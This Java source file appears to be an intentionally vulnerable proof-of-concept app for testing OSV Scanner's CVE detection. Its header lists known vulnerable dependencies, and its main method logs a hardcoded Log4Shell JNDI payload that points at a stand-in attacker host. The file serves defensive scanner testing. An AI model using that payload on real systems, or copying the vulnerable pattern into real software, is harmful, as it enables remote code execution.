package com.osvpoc;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Intentionally vulnerable Java application for OSV Scanner CVE detection POC.
 *
 * Vulnerable dependencies included (DO NOT use in production):
 *
 *  CVE-2021-44228  log4j-core 2.14.1        Log4Shell RCE         CVSS 10.0 CRITICAL
 *  CVE-2022-22965  spring-webmvc 5.3.17     Spring4Shell RCE      CVSS  9.8 CRITICAL
 *  CVE-2015-7501   commons-collections 3.2.1 Deserialization RCE  CVSS  9.8 CRITICAL
 *  CVE-2016-1000027 spring-web 5.3.17       HttpInvoker RCE       CVSS  9.8 CRITICAL
 *  CVE-2021-26291  maven-core 3.8.1         Build hijacking        CVSS  9.1 CRITICAL
 *  CVE-2019-10086  commons-beanutils 1.9.3  ClassLoader attack     CVSS  7.3 HIGH
 *  CVE-2022-42003  jackson-databind 2.13.2  Resource exhaustion    CVSS  7.5 HIGH
 *  CVE-2023-44487  netty-codec-http2 4.1.86 HTTP/2 Rapid Reset     CVSS  7.5 HIGH
 *  CVE-2022-25857  snakeyaml 1.30           YAML DoS               CVSS  7.5 HIGH
 *  CVE-2020-13956  httpclient 4.5.12        URI handling flaw      CVSS  5.3 MEDIUM
 */
public class App {

    // CVE-2021-44228: Log4Shell — logging user input unsanitised triggers JNDI lookup
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        System.out.println("=== OSV POC: Vulnerable Java App ===");
        System.out.println("This app uses intentionally vulnerable dependencies.");
        System.out.println("Run OSV Scanner against pom.xml to detect CVEs.");

        // Simulated vulnerable log call (Log4Shell vector)
        String userInput = "${jndi:ldap://attacker.com/exploit}";
        logger.info("User input received: {}", userInput);
    }
}
